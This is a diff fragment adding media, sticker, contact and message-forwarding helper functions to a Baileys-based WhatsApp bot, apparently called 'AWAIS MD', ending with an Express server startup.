+      let mtype = Object.keys(message.message)[0]
+      let content = await generateForwardMessageContent(message, forceForward)
+      let ctype = Object.keys(content)[0]
+      let context = {}
+      if (mtype != "conversation") context = message.message[mtype].contextInfo
+      content[ctype].contextInfo = {
+          ...context,
+          ...content[ctype].contextInfo
+      }
+      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+          ...content[ctype],
+          ...options,
+          ...(options.contextInfo ? {
+              contextInfo: {
+                  ...content[ctype].contextInfo,
+                  ...options.contextInfo
+              }
+          } : {})
+      } : {})
+      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+      return waMessage
+    }
+    //=================================================
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+      let quoted = message.msg ? message.msg : message
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(quoted, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+      let type = await FileType.fromBuffer(buffer)
+      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+          // save to file
+      await fs.writeFileSync(trueFileName, buffer)
+      return trueFileName
+    }
+    //=================================================
+    conn.downloadMediaMessage = async(message) => {
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(message, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+    
+      return buffer
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} message
+    * @param {*} forceForward
+    * @param {*} options
+    * @returns
+    */
+    //================================================
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+                  let mime = '';
+                  let res = await axios.head(url)
+                  mime = res.headers['content-type']
+                  if (mime.split("/")[1] === "gif") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+                  }
+                  let type = mime.split("/")[0] + "Message"
+                  if (mime === "application/pdf") {
+                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "image") {
+                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "video") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "audio") {
+                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+                  }
+                }
+    //==========================================================
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+      //let copy = message.toJSON()
+      let mtype = Object.keys(copy.message)[0]
+      let isEphemeral = mtype === 'ephemeralMessage'
+      if (isEphemeral) {
+          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+      }
+      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+      let content = msg[mtype]
+      if (typeof content === 'string') msg[mtype] = text || content
+      else if (content.caption) content.caption = text || content.caption
+      else if (content.text) content.text = text || content.text
+      if (typeof content !== 'string') msg[mtype] = {
+          ...content,
+          ...options
+      }
+      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+      copy.key.remoteJid = jid
+      copy.key.fromMe = sender === conn.user.id
+    
+      return proto.WebMessageInfo.fromObject(copy)
+    }
+    
+    
+    /**
+    *
+    * @param {*} path
+    * @returns
+    */
+    //=====================================================
+    conn.getFile = async(PATH, save) => {
+      let res
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
+      let type = await FileType.fromBuffer(data) || {
+          mime: 'application/octet-stream',
+          ext: '.bin'
+      }
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
+      return {
+          res,
+          filename,
+          size: await getSizeMedia(data),
+          ...type,
+          data
+      }
+    
+    }
+    //=====================================================
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+      let types = await conn.getFile(PATH, true)
+      let { filename, size, ext, mime, data } = types
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif.js')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.parseMention = async(text) => {
+      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+    }
+    //=====================================================
+    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+      let types = await conn.getFile(path, true)
+      let { mime, ext, res, data, filename } = types
+      if (res && res.status !== 200 || file.length <= 65536) {
+          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      }
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          caption,
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    /**
+    *
+    * @param {*} message
+    * @param {*} filename
+    * @param {*} attachExtension
+    * @returns
+    */
+    //=====================================================
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifVid(buff, options);
+      } else {
+        buffer = await videoToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+    //=====================================================
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifImg(buff, options);
+      } else {
+        buffer = await imageToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+        /**
+         *
+         * @param {*} jid
+         * @param {*} path
+         * @param {*} quoted
+         * @param {*} options
+         * @returns
+         */
+    //=====================================================
+    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+    
+            /**
+             *
+             * @param {*} jid
+             * @param {*} path
+             * @param {*} quoted
+             * @param {*} options
+             * @returns
+             */
+    //=====================================================
+    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} path
+    * @param {*} caption
+    * @param {*} quoted
+    * @param {*} options
+    * @returns
+    */
+    //=====================================================
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+    
+    /**
+     *
+     * @param {*} jid
+     * @param {*} path
+     * @param {*} caption
+     * @param {*} quoted
+     * @param {*} options
+     * @returns
+     */
+    //=====================================================
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+      let buttonMessage = {
+              text,
+              footer,
+              buttons,
+              headerType: 2,
+              ...options
+          }
+          //========================================================================================================================================
+      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+    }
+    //=====================================================
+    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+          templateMessage: {
+              hydratedTemplate: {
+                  imageMessage: message.imageMessage,
+                  "hydratedContentText": text,
+                  "hydratedFooterText": footer,
+                  "hydratedButtons": but
+              }
+          }
+      }), options)
+      conn.relayMessage(jid, template.message, { messageId: template.key.id })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} buttons
+    * @param {*} caption
+    * @param {*} footer
+    * @param {*} quoted
+    * @param {*} options
+    */
+    //=====================================================
+    conn.getName = (jid, withoutContact = false) => {
+            id = conn.decodeJid(jid);
+
+            withoutContact = conn.withoutContact || withoutContact;
+
+            let v;
+
+            if (id.endsWith('@g.us'))
+                return new Promise(async resolve => {
+                    v = store.contacts[id] || {};
+
+                    if (!(v.name.notify || v.subject))
+                        v = conn.groupMetadata(id) || {};
+
+                    resolve(
+                        v.name ||
+                            v.subject ||
+                            PhoneNumber(
+                                '+' + id.replace('@s.whatsapp.net', ''),
+                            ).getNumber('international'),
+                    );
+                });
+            else
+                v =
+                    id === '0@s.whatsapp.net'
+                        ? {
+                                id,
+
+                                name: 'WhatsApp',
+                          }
+                        : id === conn.decodeJid(conn.user.id)
+                        ? conn.user
+                        : store.contacts[id] || {};
+
+            return (
+                (withoutContact ? '' : v.name) ||
+                v.subject ||
+                v.verifiedName ||
+                PhoneNumber(
+                    '+' + jid.replace('@s.whatsapp.net', ''),
+                ).getNumber('international')
+            );
+        };
+
+        // Vcard Functionality
+        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+            let list = [];
+            for (let i of kon) {
+                list.push({
+                    displayName: await conn.getName(i + '@s.whatsapp.net'),
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+                        i + '@s.whatsapp.net',
+                    )}\nFN:${
+                        global.OwnerName
+                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+                        global.email
+                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+                        global.github
+                    }/awais-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                        global.location
+                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+                });
+            }
+            conn.sendMessage(
+                jid,
+                {
+                    contacts: {
+                        displayName: `${list.length} Contact`,
+                        contacts: list,
+                    },
+                    ...opts,
+                },
+                { quoted },
+            );
+        };
+
+        // Status aka brio
+        conn.setStatus = status => {
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: '@s.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'status',
+                },
+                content: [
+                    {
+                        tag: 'status',
+                        attrs: {},
+                        content: Buffer.from(status, 'utf-8'),
+                    },
+                ],
+            });
+            return status;
+        };
+    conn.serializeM = mek => sms(conn, mek, store);
+  }
+  
+  app.get("/", (req, res) => {
+  res.send("AWAIS MD STARTED ✅");
+  });
+  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  setTimeout(() => {
+  connectToWA()
+  }, 4000);
